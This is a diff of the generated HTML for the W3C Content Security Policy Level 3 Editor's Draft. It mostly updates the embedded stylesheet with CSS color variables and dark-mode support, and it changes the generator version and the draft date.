@@ -68,9 +68,18 @@
  *
  ******************************************************************************/
 
+/* color variables included separately for reliability */
+
 /******************************************************************************/
 /*                                   Body                                     */
 /******************************************************************************/
+
+	html {
+		color: black;
+		color: var(--text);
+		background-color: white;
+		background-color: var(--bg);
+	}
 
 	body {
 		counter-reset: example figure issue;
@@ -90,9 +99,7 @@
 		overflow-wrap: break-word;
 		hyphens: auto;
 
-		/* Colors */
-		color: black;
-		background: white top left fixed no-repeat;
+		background: transparent top left fixed no-repeat;
 		background-size: 25px auto;
 	}
 
@@ -124,10 +131,13 @@
 	.head img[src*="logos/W3C"] {
 		display: block;
 		border: solid #1a5e9a;
+		border: solid var(--logo-bg);
 		border-width: .65rem .7rem .6rem;
 		border-radius: .4rem;
 		background: #1a5e9a;
+		background: var(--logo-bg);
 		color: white;
+		color: var(--logo-text);
 		font-weight: bold;
 	}
 
@@ -138,7 +148,9 @@
 
 	.head a:active > img[src*="logos/W3C"] {
 		background: #c00;
+		background: var(--logo-active-bg);
 		border-color: #c00;
+		border-color: var(--logo-active-bg);
 	}
 
 	/* see also additional rules in Link Styling section */
@@ -165,7 +177,6 @@
 			border-top-right-radius: 2rem;
 			box-shadow: 0 0 2px;
 			font-size: 1.5em;
-			color: black;
 		}
 		#toc-nav > a {
 			display: block;
@@ -175,23 +186,32 @@
 			padding: .1em 0.3em;
 			margin: 0;
 
-			background: white;
 			box-shadow: 0 0 2px;
 			border: none;
 			border-top-right-radius: 1.33em;
+
+			color: #707070;
+			color: var(--tocnav-normal-text);
 			background: white;
+			background: var(--tocnav-normal-bg);
 		}
+		#toc-nav > a:hover,
+		#toc-nav > a:focus {
+			color: black;
+			color: var(--tocnav-hover-text);
+			background: #f8f8f8;
+			background: var(--tocnav-hover-bg);
+		}
+		#toc-nav > a:active {
+			color: #c00;
+			color: var(--tocnav-active-text);
+			background: white;
+			background: var(--tocnav-active-bg);
+		}
+
 		#toc-nav > #toc-jump {
 			padding-bottom: 2em;
 			margin-bottom: -1.9em;
-		}
-
-		#toc-nav > a:hover,
-		#toc-nav > a:focus {
-			background: #f8f8f8;
-		}
-		#toc-nav > a:not(:hover):not(:focus) {
-			color: #707070;
 		}
 
 		/* statusbar gets in the way on keyboard focus; remove once browsers fix */
@@ -205,26 +225,6 @@
 		}
 		#toc-nav > a > span + span {
 			padding-right: 0.2em;
-		}
-
-		#toc-toggle-inline {
-			vertical-align: 0.05em;
-			font-size: 80%;
-			color: gray;
-			color: hsla(203,20%,40%,.7);
-			border-style: none;
-			background: transparent;
-			position: relative;
-		}
-		#toc-toggle-inline:hover:not(:active),
-		#toc-toggle-inline:focus:not(:active) {
-			text-shadow: 1px 1px silver;
-			top: -1px;
-			left: -1px;
-		}
-
-		#toc-nav :active {
-			color: #C00;
 		}
 	}
 
@@ -243,10 +243,14 @@
 			padding: 0 1em;
 			padding-left: 42px;
 			padding-left: calc(1em + 26px);
+			color: black;
+			color: var(--tocsidebar-text);
 			background: inherit;
 			background-color: #f7f8f9;
+			background-color: var(--tocsidebar-bg);
 			z-index: 1;
 			box-shadow: -.1em 0 .25em rgba(0,0,0,.1) inset;
+			box-shadow: -.1em 0 .25em var(--tocsidebar-shadow) inset;
 		}
 		body.toc-sidebar #toc h2 {
 			margin-top: .8rem;
@@ -256,6 +260,7 @@
 			font-weight: bold;
 			color: gray;
 			color: hsla(203,20%,40%,.7);
+			color: var(--tocsidebar-heading-text);
 		}
 		body.toc-sidebar #toc-jump:not(:focus) {
 			width: 0;
@@ -283,10 +288,14 @@
 			padding: 0 1em;
 			padding-left: 42px;
 			padding-left: calc(1em + 26px);
+			color: black;
+			color: var(--tocsidebar-text);
 			background: inherit;
 			background-color: #f7f8f9;
+			background-color: var(--tocsidebar-bg);
 			z-index: 1;
 			box-shadow: -.1em 0 .25em rgba(0,0,0,.1) inset;
+			box-shadow: -.1em 0 .25em var(--tocsidebar-shadow) inset;
 		}
 		body:not(.toc-inline) #toc h2 {
 			margin-top: .8rem;
@@ -296,6 +305,7 @@
 			font-weight: bold;
 			color: gray;
 			color: hsla(203,20%,40%,.7);
+			color: var(--tocsidebar-heading-text);
 		}
 
 		body:not(.toc-inline) {
@@ -338,7 +348,7 @@
 
 	h1, h2, h3 {
 		color: #005A9C;
-		background: transparent;
+		color: var(--heading-text);
 	}
 
 	h1 { font-size: 170%; }
@@ -365,11 +375,13 @@
 
 /** Section divider ***********************************************************/
 
-	:not(.head) > hr {
+	:not(.head) > :not(.head) + hr {
 		font-size: 1.5em;
 		text-align: center;
 		margin: 1em auto;
 		height: auto;
+		color: black;
+		color: var(--hr-text);
 		border: transparent solid 0;
 		background: transparent;
 	}
@@ -412,12 +424,15 @@
 	ol.algorithm ol:not(.algorithm),
 	.algorithm > ol ol:not(.algorithm) {
 	 border-left: 0.5em solid #DEF;
+	 border-left: 0.5em solid var(--algo-border);
 	}
 
 	/* Put nice boxes around each algorithm. */
 	[data-algorithm]:not(.heading) {
 	  padding: .5em;
-	  border: thin solid #ddd; border-radius: .5em;
+	  border: thin solid #ddd;
+	  border: thin solid var(--algo-border);
+	  border-radius: .5em;
 	  margin: .5em calc(-0.5em - 1px);
 	}
 	[data-algorithm]:not(.heading) > :first-child {
@@ -478,8 +493,20 @@
 
 /** Change Marking ************************************************************/
 
-	del { color: red;  text-decoration: line-through; }
-	ins { color: #080; text-decoration: underline;    }
+	del {
+		color: red;
+		color: var(--del-text);
+		background: transparent;
+		background: var(--del-bg);
+		text-decoration: line-through;
+	}
+	ins {
+		color: #080;
+		color: var(--ins-text);
+		background: transparent;
+		background: var(--ins-bg);
+		text-decoration: underline;
+	}
 
 /** Miscellaneous improvements to inline formatting ***************************/
 
@@ -497,9 +524,14 @@
 	pre, code, samp {
 		font-family: Menlo, Consolas, "DejaVu Sans Mono", Monaco, monospace;
 		font-size: .9em;
-		page-break-inside: avoid;
 		hyphens: none;
 		text-transform: none;
+		text-align: left;
+		text-align: start;
+		font-variant: normal;
+		orphans: 3;
+		widows: 3;
+		page-break-before: avoid;
 	}
 	pre code,
 	code code {
@@ -525,14 +557,19 @@
 	/* We hyperlink a lot, so make it less intrusive */
 	a[href] {
 		color: #034575;
+		color: var(--a-normal-text);
 		text-decoration: none;
 		border-bottom: 1px solid #707070;
+		border-bottom: 1px solid var(--a-normal-underline);
 		/* Need a bit of extending for it to look okay */
 		padding: 0 1px 0;
 		margin: 0 -1px 0;
 	}
 	a:visited {
-		border-bottom-color: #BBB;
+		color: #034575;
+		color: var(--a-visited-text);
+		border-bottom-color: #bbb;
+		border-bottom-color: var(--a-visited-underline);
 	}
 
 	/* Use distinguishing colors when user is interacting with the link */
@@ -540,12 +577,15 @@
 	a[href]:hover {
 		background: #f8f8f8;
 		background: rgba(75%, 75%, 75%, .25);
+		background: var(--a-hover-bg);
 		border-bottom-width: 3px;
 		margin-bottom: -2px;
 	}
 	a[href]:active {
-		color: #C00;
-		border-color: #C00;
+		color: #c00;
+		color: var(--a-active-text);
+		border-color: #c00;
+		border-color: var(--a-active-underline);
 	}
 
 	/* Backout above styling for W3C logo */
@@ -564,6 +604,11 @@
 		border-style: none;
 	}
 
+	img, svg {
+		/* Intentionally not color-scheme aware. */
+		background: white;
+	}
+
 	/* For autogen numbers, add
 	   .caption::before, figcaption::before { content: "Figure " counter(figure) ". "; }
 	*/
@@ -577,6 +622,7 @@
 	.figure object, .sidefigure object, figure object {
 		max-width: 100%;
 		margin: auto;
+		height: auto;
 	}
 	.figure pre, .sidefigure pre, figure pre {
 		text-align: left;
@@ -639,25 +685,46 @@
 		margin-bottom: 0;
 	}
 
+
+	.issue::before, .issue > .marker,
+	.example::before, .example > .marker,
+	.note::before, .note > .marker,
+	details.note > summary > .marker {
+		text-transform: uppercase;
+		padding-right: 1em;
+	}
+
+	.example::before, .example > .marker {
+		display: block;
+		padding-right: 0em;
+	}
+
 /** Blockquotes ***************************************************************/
 
 	blockquote {
 		border-color: silver;
+		border-color: var(--blockquote-border);
+		background: transparent;
+		background: var(--blockquote-bg);
+		color: currentcolor;
+		color: var(--blockquote-text);
 	}
 
 /** Open issue ****************************************************************/
 
 	.issue {
-		border-color: #E05252;
-		background: #FBE9E9;
+		border-color: #e05252;
+		border-color: var(--issue-border);
+		background: #fbe9e9;
+		background: var(--issue-bg);
+		color: black;
+		color: var(--issue-text);
 		counter-increment: issue;
 		overflow: auto;
 	}
 	.issue::before, .issue > .marker {
-		text-transform: uppercase;
-		color: #AE1E1E;
-		padding-right: 1em;
-		text-transform: uppercase;
+		color: #831616;
+		color: var(--issueheading-text);
 	}
 	/* Add .issue::before { content: "Issue " counter(issue) " "; } for autogen numbers,
 	   or use class="marker" to mark up the issue number in source. */
@@ -665,17 +732,19 @@
 /** Example *******************************************************************/
 
 	.example {
-		border-color: #E0CB52;
-		background: #FCFAEE;
+		border-color: #e0cb52;
+		border-color: var(--example-border);
+		background: #fcfaee;
+		background: var(--example-bg);
+		color: black;
+		color: var(--example-text);
 		counter-increment: example;
 		overflow: auto;
 		clear: both;
 	}
 	.example::before, .example > .marker {
-		text-transform: uppercase;
-		color: #827017;
-		min-width: 7.5em;
-		display: block;
+		color: #574b0f;
+		color: var(--exampleheading-text);
 	}
 	/* Add .example::before { content: "Example " counter(example) " "; } for autogen numbers,
 	   or use class="marker" to mark up the example number in source. */
@@ -683,27 +752,26 @@
 /** Non-normative Note ********************************************************/
 
 	.note {
-		border-color: #52E052;
-		background: #E9FBE9;
+		border-color: #52e052;
+		border-color: var(--note-border);
+		background: #e9fbe9;
+		background: var(--note-bg);
+		color: black;
+		color: var(--note-text);
 		overflow: auto;
 	}
 
 	.note::before, .note > .marker,
-	details.note > summary::before,
-	details.note > summary > .marker {
-		text-transform: uppercase;
-		display: block;
+	details.note > summary {
 		color: hsl(120, 70%, 30%);
+		color: var(--noteheading-text);
 	}
-	/* Add .note::before { content: "Note"; } for autogen label,
+	/* Add .note::before { content: "Note "; } for autogen label,
 	   or use class="marker" to mark up the label in source. */
 
-	details.note > summary {
-		display: block;
-		color: hsl(120, 70%, 30%);
-	}
 	details.note[open] > summary {
 		border-bottom: 1px silver solid;
+		border-bottom: 1px var(--notesummary-underline) solid;
 	}
 
 /** Assertion Box *************************************************************/
@@ -711,7 +779,11 @@
 
 	.assertion {
 		border-color: #AAA;
+		border-color: var(--assertion-border);
 		background: #EEE;
+		background: var(--assertion-bg);
+		color: black;
+		color: var(--assertion-text);
 	}
 
 /** Advisement Box ************************************************************/
@@ -719,15 +791,20 @@
 
 	.advisement {
 		border-color: orange;
+		border-color: var(--advisement-border);
 		border-style: none solid;
-		background: #FFEECC;
+		background: #fec;
+		background: var(--advisement-bg);
+		color: black;
+		color: var(--advisement-text);
 	}
 	strong.advisement {
 		display: block;
 		text-align: center;
 	}
-	.advisement > .marker {
-		color: #B35F00;
+	.advisement::before, .advisement > .marker {
+		color: #b35f00;
+		color: var(--advisementheading-text);
 	}
 
 /** Spec Obsoletion Notice ****************************************************/
@@ -743,27 +820,30 @@
 	.annoying-warning:not(details),
 	details.annoying-warning:not([open]) > summary,
 	details.annoying-warning[open] {
-		background: #fdd;
-		color: red;
-		font-weight: bold;
+		background: hsla(40,100%,50%,0.95);
+		background: var(--warning-bg);
+		color: black;
+		color: var(--warning-text);
 		padding: .75em 1em;
-		border: thick red;
-		border-style: solid;
-		border-radius: 1em;
+		border: red;
+		border: var(--warning-border);
+		border-style: solid none;
+		box-shadow: 0 2px 8px black;
+		text-align: center;
 	}
 	.annoying-warning :last-child {
 		margin-bottom: 0;
 	}
 
-@media not print {
-	details.annoying-warning[open] {
-		position: fixed;
-		left: 1em;
-		right: 1em;
-		bottom: 1em;
-		z-index: 1000;
+	@media not print {
+		details.annoying-warning[open] {
+			position: fixed;
+			left: 0;
+			right: 0;
+			bottom: 2em;
+			z-index: 1000;
+		}
 	}
-}
 
 	details.annoying-warning:not([open]) > summary {
 		text-align: center;
@@ -773,9 +853,13 @@
 
 	.def {
 		padding: .5em 1em;
-		background: #DEF;
+		background: #def;
+		background: var(--def-bg);
 		margin: 1.2em 0;
-		border-left: 0.5em solid #8CCBF2;
+		border-left: 0.5em solid #8ccbf2;
+		border-left: 0.5em solid var(--def-border);
+		color: black;
+		color: var(--def-text);
 	}
 
 /******************************************************************************/
@@ -800,6 +884,7 @@
 		padding: 0.5em;
 		vertical-align: baseline;
 		border-bottom: 1px solid #bbd7e9;
+		border-bottom: 1px solid var(--defrow-border);
 	}
 
 	table.def > tbody > tr:last-child th,
@@ -820,10 +905,10 @@
 	}
 
 	/* A footnote at the bottom of a def table */
-	table.def           td.footnote {
+	table.def td.footnote {
 		padding-top: 0.6em;
 	}
-	table.def           td.footnote::before {
+	table.def td.footnote::before {
 		content: " ";
 		display: block;
 		height: 0.6em;
@@ -868,6 +953,7 @@
 		padding: 0.5em 1em;
 		border-width: 1px;
 		border-color: silver;
+		border-color: var(--datacell-border);
 		border-top-style: solid;
 	}
 
@@ -892,6 +978,7 @@
 	table.index tbody th:first-child  {
 		border-right: 2px solid;
 		border-top: 1px solid silver;
+		border-top: 1px solid var(--datacell-border);
 		padding-right: 1em;
 	}
 
@@ -903,13 +990,14 @@
 	table.complex.data th,
 	table.complex.data td {
 		border: 1px solid silver;
+		border: 1px solid var(--datacell-border);
 		text-align: center;
 	}
 
 	table.data.longlastcol td:last-child,
 	table.data td.long {
-	 vertical-align: baseline;
-	 text-align: left;
+		vertical-align: baseline;
+		text-align: left;
 	}
 
 	table.data img {
@@ -967,12 +1055,15 @@ Possible extra rowspan handling
 		display: block;
 		/* Reverse color scheme */
 		color: black;
-		border-color: #3980B5;
-		border-bottom-width: 3px !important;
-		margin-bottom: 0px !important;
+		color: var(--toclink-text);
+		border-color: #3980b5;
+		border-color: var(--toclink-underline);
 	}
 	.toc a:visited {
+		color: black;
+		color: var(--toclink-visited-text);
 		border-color: #054572;
+		border-color: var(--toclink-visited-underline);
 	}
 	.toc a:not(:focus):not(:hover) {
 		/* Allow colors to cascade through from link styling */
@@ -1027,6 +1118,15 @@ Possible extra rowspan handling
 			.toc > li li li li .secno    { margin-left: -6rem; }
 			.toc > li li li li li .secno { margin-left: -7rem; }
 		}
+		/* Loosen it on wide screens */
+		@media screen and (min-width: 78em) {
+			body:not(.toc-inline) :not(li) > .toc              { margin-left:  4rem; }
+			body:not(.toc-inline) .toc .secno                  { margin-left: -4rem; }
+			body:not(.toc-inline) .toc > li li li              { margin-left:  1rem; }
+			body:not(.toc-inline) .toc > li li li .secno       { margin-left: -5rem; }
+			body:not(.toc-inline) .toc > li li li li .secno    { margin-left: -6rem; }
+			body:not(.toc-inline) .toc > li li li li li .secno { margin-left: -7rem; }
+	}
 	/* } */
 
 	@supports (display:grid) and (display:contents) {
@@ -1068,9 +1168,12 @@ Possible extra rowspan handling
 			width: auto;
 			margin-right: 1rem;
 		}
-		#toc .content:hover {
+		#toc .content:hover,
+		#toc .content:focus {
 			background: rgba(75%, 75%, 75%, .25);
+			background: var(--a-hover-bg);
 			border-bottom: 3px solid #054572;
+			border-bottom: 3px solid var(--toclink-underline);
 			margin-bottom: -3px;
 		}
 		#toc li li li .content {
@@ -1095,12 +1198,13 @@ Possible extra rowspan handling
 	ul.index ul,
 	ul.index dl { font-size: smaller; }
 	@media not print {
-		ul.index li span {
+		ul.index li span:not(.dfn-paneled) {
 			white-space: nowrap;
 			color: transparent; }
 		ul.index li a:hover + span,
 		ul.index li a:focus + span {
 			color: #707070;
+			color: var(--indexinfo-text);
 		}
 	}
 
@@ -1122,7 +1226,10 @@ Possible extra rowspan handling
 
 	table.index tr:hover td:not([rowspan]),
 	table.index tr:hover th:not([rowspan]) {
+		color: black;
+		color: var(--indextable-hover-text);
 		background: #f7f8f9;
+		background: var(--indextable-hover-bg);
 	}
 
 	/* The link in the first column in the property table (formerly a TD) */
@@ -1147,13 +1254,6 @@ Possible extra rowspan handling
 	@page {
 		margin: 1.5cm 1.1cm;
 	}
-
-/******************************************************************************/
-/*                                    Legacy                                  */
-/******************************************************************************/
-
-	/* This rule is inherited from past style sheets. No idea what it's for. */
-	.hide { display: none }
 
 
 
@@ -1221,7 +1321,7 @@ Possible extra rowspan handling
 		}
 	}
 </style>
-  <meta content="Bikeshed version 86e7fe4e, updated Thu Jul 16 13:37:52 2020 -0700" name="generator">
+  <meta content="Bikeshed version 89ebb6ab, updated Fri Oct 9 15:32:07 2020 -0700" name="generator">
   <link href="https://www.w3.org/TR/CSP3/" rel="canonical">
 <style>
   ul.toc ul ul ul {
@@ -1259,7 +1359,7 @@ Possible extra rowspan handling
 <style>/* style-autolinks */
 
 .css.css, .property.property, .descriptor.descriptor {
-    color: #005a9c;
+    color: var(--a-normal-text);
     font-size: inherit;
     font-family: inherit;
 }
@@ -1318,6 +1418,114 @@ pre .property::before, pre .property::after {
 [data-link-type=biblio] {
     white-space: pre;
 }</style>
+<style>/* style-colors */
+
+/* Any --*-text not paired with a --*-bg is assumed to have a transparent bg */
+html {
+    color: black;
+    color: var(--text);
+    background-color: white;
+    background-color: var(--bg);
+}
+:root {
+    color-scheme: light dark;
+
+    --text: black;
+    --bg: white;
+
+    --logo-bg: #1a5e9a;
+    --logo-active-bg: #c00;
+    --logo-text: white;
+
+    --tocnav-normal-text: #707070;
+    --tocnav-normal-bg: var(--bg);
+    --tocnav-hover-text: var(--tocnav-normal-text);
+    --tocnav-hover-bg: #f8f8f8;
+    --tocnav-active-text: #c00;
+    --tocnav-active-bg: var(--tocnav-normal-bg);
+
+    --tocsidebar-text: var(--text);
+    --tocsidebar-bg: #f7f8f9;
+    --tocsidebar-shadow: rgba(0,0,0,.1);
+    --tocsidebar-heading-text: hsla(203,20%,40%,.7);
+
+    --toclink-text: var(--text);
+    --toclink-underline: #3980b5;
+    --toclink-visited-text: var(--toclink-text);
+    --toclink-visited-underline: #054572;
+
+    --heading-text: #005a9c;
+
+    --hr-text: var(--text);
+
+    --algo-border: #def;
+
+    --del-text: red;
+    --del-bg: transparent;
+    --ins-text: #080;
+    --ins-bg: transparent;
+
+    --a-normal-text: #034575;
+    --a-normal-underline: #707070;
+    --a-visited-text: var(--a-normal-text);
+    --a-visited-underline: #bbb;
+    --a-hover-bg: rgba(75%, 75%, 75%, .25);
+    --a-active-text: #c00;
+    --a-active-underline: #c00;
+
+    --blockquote-border: silver;
+    --blockquote-bg: transparent;
+    --blockquote-text: currentcolor;
+
+    --issue-border: #e05252;
+    --issue-bg: #fbe9e9;
+    --issue-text: var(--text);
+    --issueheading-text: #831616;
+
+    --example-border: #e0cb52;
+    --example-bg: #fcfaee;
+    --example-text: var(--text);
+    --exampleheading-text: #574b0f;
+
+    --note-border: #52e052;
+    --note-bg: #e9fbe9;
+    --note-text: var(--text);
+    --noteheading-text: hsl(120, 70%, 30%);
+    --notesummary-underline: silver;
+
+    --assertion-border: #aaa;
+    --assertion-bg: #eee;
+    --assertion-text: black;
+
+    --advisement-border: orange;
+    --advisement-bg: #fec;
+    --advisement-text: var(--text);
+    --advisementheading-text: #b35f00;
+
+    --warning-border: red;
+    --warning-bg: hsla(40,100%,50%,0.95);
+    --warning-text: var(--text);
+
+    --def-border: #8ccbf2;
+    --def-bg: #def;
+    --def-text: var(--text);
+    --defrow-border: #bbd7e9;
+
+    --datacell-border: silver;
+
+    --indexinfo-text: #707070;
+
+    --indextable-hover-text: black;
+    --indextable-hover-bg: #f7f8f9;
+
+    --outdatedspec-bg: rgba(0, 0, 0, .5);
+    --outdatedspec-text: black;
+    --outdated-bg: maroon;
+    --outdated-text: white;
+    --outdated-shadow: red;
+
+    --editedrec-bg: darkorange;
+}</style>
 <style>/* style-counters */
 
 body {
@@ -1349,6 +1557,10 @@ figcaption:not(.no-marker)::before {
 }</style>
 <style>/* style-dfn-panel */
 
+:root {
+    --dfnpanel-bg: #ddd;
+    --dfnpanel-text: var(--text);
+}
 .dfn-panel {
     position: absolute;
     z-index: 35;
@@ -1360,14 +1572,14 @@ figcaption:not(.no-marker)::before {
     overflow: auto;
     padding: 0.5em 0.75em;
     font: small Helvetica Neue, sans-serif, Droid Sans Fallback;
-    background: #DDDDDD;
-    color: black;
+    background: var(--dfnpanel-bg);
+    color: var(--dfnpanel-text);
     border: outset 0.2em;
 }
 .dfn-panel:not(.on) { display: none; }
 .dfn-panel * { margin: 0; padding: 0; text-indent: 0; }
 .dfn-panel > b { display: block; }
-.dfn-panel a { color: black; }
+.dfn-panel a { color: var(--dfnpanel-text); }
 .dfn-panel a:not(:hover) { text-decoration: none !important; border-bottom: none !important; }
 .dfn-panel > b + b { margin-top: 0.25em; }
 .dfn-panel ul { padding: 0; }
@@ -1396,6 +1608,11 @@ figcaption:not(.no-marker)::before {
 }</style>
 <style>/* style-selflinks */
 
+:root {
+    --selflink-text: white;
+    --selflink-bg: gray;
+    --selflink-hover-text: black;
+}
 .heading, .issue, .note, .example, li, dt {
     position: relative;
 }
@@ -1425,8 +1642,8 @@ dfn > a.self-link {
     opacity: 0;
     width: 1.5em;
     height: 1.5em;
-    background: gray;
-    color: white;
+    background: var(--selflink-bg);
+    color: var(--selflink-text);
     font-style: normal;
     transition: opacity .2s, background-color .2s, color .2s;
 }
@@ -1434,17 +1651,23 @@ dfn:hover > a.self-link {
     opacity: 1;
 }
 dfn > a.self-link:hover {
-    color: black;
+    color: var(--selflink-hover-text);
 }
 
 a.self-link::before            { content: "¶"; }
 .heading > a.self-link::before { content: "§"; }
-dfn > a.self-link::before      { content: "#"; }</style>
+dfn > a.self-link::before      { content: "#"; }
+</style>
 <style>/* style-syntax-highlighting */
-pre.idl.highlight { color: #708090; }
-.highlight:not(.idl) { background: hsl(24, 20%, 95%); }
+
+            pre.idl.highlight {
+                background: var(--borderedblock-bg, var(--def-bg));
+            }
+            
 code.highlight { padding: .1em; border-radius: .3em; }
 pre.highlight, pre > code.highlight { display: block; padding: 1em; margin: .5em 0; overflow: auto; border-radius: 0; }
+
+.highlight:not(.idl) { background: rgba(0, 0, 0, .03); }
 c-[a] { color: #990055 } /* Keyword.Declaration */
 c-[b] { color: #990055 } /* Keyword.Type */
 c-[c] { color: #708090 } /* Comment */
@@ -1509,11 +1732,194 @@ c-[il] { color: #000000 } /* Literal.Number.Integer.Long */
     var.selected5 { background-color: #82DDFF; box-shadow: 0 0 0 2px #82DDFF; }
     var.selected6 { background-color: #FFBCF2; box-shadow: 0 0 0 2px #FFBCF2; }
     </style>
+<style>/* style-darkmode */
+
+@media (prefers-color-scheme: dark) {
+    :root {
+        --text: #ddd;
+        --bg: black;
+
+        --logo-bg: #1a5e9a;
+        --logo-active-bg: #c00;
+        --logo-text: white;
+
+        --tocnav-normal-text: #999;
+        --tocnav-normal-bg: var(--bg);
+        --tocnav-hover-text: var(--tocnav-normal-text);
+        --tocnav-hover-bg: #080808;
+        --tocnav-active-text: #f44;
+        --tocnav-active-bg: var(--tocnav-normal-bg);
+
+        --tocsidebar-text: var(--text);
+        --tocsidebar-bg: #080808;
+        --tocsidebar-shadow: rgba(255,255,255,.1);
+        --tocsidebar-heading-text: hsla(203,20%,40%,.7);
+
+        --toclink-text: var(--text);
+        --toclink-underline: #6af;
+        --toclink-visited-text: var(--toclink-text);
+        --toclink-visited-underline: #054572;
+
+        --heading-text: #8af;
+
+        --hr-text: var(--text);
+
+        --algo-border: #456;
+
+        --del-text: #f44;
+        --del-bg: transparent;
+        --ins-text: #4a4;
+        --ins-bg: transparent;
+
+        --a-normal-text: #6af;
+        --a-normal-underline: #555;
+        --a-visited-text: var(--a-normal-text);
+        --a-visited-underline: var(--a-normal-underline);
+        --a-hover-bg: rgba(25%, 25%, 25%, .2);
+        --a-active-text: #f44;
+        --a-active-underline: var(--a-active-text);
+
+        --borderedblock-bg: rgba(255, 255, 255, .05);
+
+        --blockquote-border: silver;
+        --blockquote-bg: var(--borderedblock-bg);
+        --blockquote-text: currentcolor;
+
+        --issue-border: #e05252;
+        --issue-bg: var(--borderedblock-bg);
+        --issue-text: var(--text);
+        --issueheading-text: hsl(0deg, 70%, 70%);
+
+        --example-border: hsl(50deg, 90%, 60%);
+        --example-bg: var(--borderedblock-bg);
+        --example-text: var(--text);
+        --exampleheading-text: hsl(50deg, 70%, 70%);
+
+        --note-border: hsl(120deg, 100%, 35%);
+        --note-bg: var(--borderedblock-bg);
+        --note-text: var(--text);
+        --noteheading-text: hsl(120, 70%, 70%);
+        --notesummary-underline: silver;
+
+        --assertion-border: #444;
+        --assertion-bg: var(--borderedblock-bg);
+        --assertion-text: var(--text);
+
+        --advisement-border: orange;
+        --advisement-bg: #222218;
+        --advisement-text: var(--text);
+        --advisementheading-text: #f84;
+
+        --warning-border: red;
+        --warning-bg: hsla(40,100%,20%,0.95);
+        --warning-text: var(--text);
+
+        --def-border: #8ccbf2;
+        --def-bg: #080818;
+        --def-text: var(--text);
+        --defrow-border: #136;
+
+        --datacell-border: silver;
+
+        --indexinfo-text: #aaa;
+
+        --indextable-hover-text: var(--text);
+        --indextable-hover-bg: #181818;
+
+        --outdatedspec-bg: rgba(255, 255, 255, .5);
+        --outdatedspec-text: black;
+        --outdated-bg: maroon;
+        --outdated-text: white;
+        --outdated-shadow: red;
+
+        --editedrec-bg: darkorange;
+    }
+    /* In case a transparent-bg image doesn't expect to be on a dark bg,
+       which is quite common in practice... */
+    img { background: white; }
+}
+@media (prefers-color-scheme: dark) {
+    :root {
+        --selflink-text: black;
+        --selflink-bg: silver;
+        --selflink-hover-text: white;
+    }
+}
+
+@media (prefers-color-scheme: dark) {
+    :root {
+        --dfnpanel-bg: #222;
+        --dfnpanel-text: var(--text);
+    }
+}
+@media (prefers-color-scheme: dark) {
+    .highlight:not(.idl) { background: rgba(255, 255, 255, .05); }
+
+    c-[a] { color: #d33682 } /* Keyword.Declaration */
+    c-[b] { color: #d33682 } /* Keyword.Type */
+    c-[c] { color: #2aa198 } /* Comment */
+    c-[d] { color: #2aa198 } /* Comment.Multiline */
+    c-[e] { color: #268bd2 } /* Name.Attribute */
+    c-[f] { color: #b58900 } /* Name.Tag */
+    c-[g] { color: #cb4b16 } /* Name.Variable */
+    c-[k] { color: #d33682 } /* Keyword */
+    c-[l] { color: #657b83 } /* Literal */
+    c-[m] { color: #657b83 } /* Literal.Number */
+    c-[n] { color: #268bd2 } /* Name */
+    c-[o] { color: #657b83 } /* Operator */
+    c-[p] { color: #657b83 } /* Punctuation */
+    c-[s] { color: #6c71c4 } /* Literal.String */
+    c-[t] { color: #6c71c4 } /* Literal.String.Single */
+    c-[u] { color: #6c71c4 } /* Literal.String.Double */
+    c-[ch] { color: #2aa198 } /* Comment.Hashbang */
+    c-[cp] { color: #2aa198 } /* Comment.Preproc */
+    c-[cpf] { color: #2aa198 } /* Comment.PreprocFile */
+    c-[c1] { color: #2aa198 } /* Comment.Single */
+    c-[cs] { color: #2aa198 } /* Comment.Special */
+    c-[kc] { color: #d33682 } /* Keyword.Constant */
+    c-[kn] { color: #d33682 } /* Keyword.Namespace */
+    c-[kp] { color: #d33682 } /* Keyword.Pseudo */
+    c-[kr] { color: #d33682 } /* Keyword.Reserved */
+    c-[ld] { color: #657b83 } /* Literal.Date */
+    c-[nc] { color: #268bd2 } /* Name.Class */
+    c-[no] { color: #268bd2 } /* Name.Constant */
+    c-[nd] { color: #268bd2 } /* Name.Decorator */
+    c-[ni] { color: #268bd2 } /* Name.Entity */
+    c-[ne] { color: #268bd2 } /* Name.Exception */
+    c-[nf] { color: #268bd2 } /* Name.Function */
+    c-[nl] { color: #268bd2 } /* Name.Label */
+    c-[nn] { color: #268bd2 } /* Name.Namespace */
+    c-[py] { color: #268bd2 } /* Name.Property */
+    c-[ow] { color: #657b83 } /* Operator.Word */
+    c-[mb] { color: #657b83 } /* Literal.Number.Bin */
+    c-[mf] { color: #657b83 } /* Literal.Number.Float */
+    c-[mh] { color: #657b83 } /* Literal.Number.Hex */
+    c-[mi] { color: #657b83 } /* Literal.Number.Integer */
+    c-[mo] { color: #657b83 } /* Literal.Number.Oct */
+    c-[sa] { color: #6c71c4 } /* Literal.String.Affix */
+    c-[sb] { color: #6c71c4 } /* Literal.String.Backtick */
+    c-[sc] { color: #6c71c4 } /* Literal.String.Char */
+    c-[dl] { color: #6c71c4 } /* Literal.String.Delimiter */
+    c-[sd] { color: #6c71c4 } /* Literal.String.Doc */
+    c-[se] { color: #6c71c4 } /* Literal.String.Escape */
+    c-[sh] { color: #6c71c4 } /* Literal.String.Heredoc */
+    c-[si] { color: #6c71c4 } /* Literal.String.Interpol */
+    c-[sx] { color: #6c71c4 } /* Literal.String.Other */
+    c-[sr] { color: #6c71c4 } /* Literal.String.Regex */
+    c-[ss] { color: #6c71c4 } /* Literal.String.Symbol */
+    c-[fm] { color: #268bd2 } /* Name.Function.Magic */
+    c-[vc] { color: #cb4b16 } /* Name.Variable.Class */
+    c-[vg] { color: #cb4b16 } /* Name.Variable.Global */
+    c-[vi] { color: #cb4b16 } /* Name.Variable.Instance */
+    c-[vm] { color: #cb4b16 } /* Name.Variable.Magic */
+    c-[il] { color: #657b83 } /* Literal.Number.Integer.Long */
+}
+</style>
  <body class="h-entry">
   <div class="head">
    <p data-fill-with="logo"><a class="logo" href="https://www.w3.org/"> <img alt="W3C" height="48" src="https://www.w3.org/StyleSheets/TR/2016/logos/W3C" width="72"> </a> </p>
    <h1>Content Security Policy Level 3</h1>
-   <h2 class="no-num no-toc no-ref heading settled" id="subtitle"><span class="content">Editor’s Draft, <time class="dt-updated" datetime="2020-07-17">17 July 2020</time></span></h2>
+   <h2 class="no-num no-toc no-ref heading settled" id="subtitle"><span class="content">Editor’s Draft, <time class="dt-updated" datetime="2020-11-04">4 November 2020</time></span></h2>
    <div data-fill-with="spec-metadata">
     <dl>
      <dt>This version:
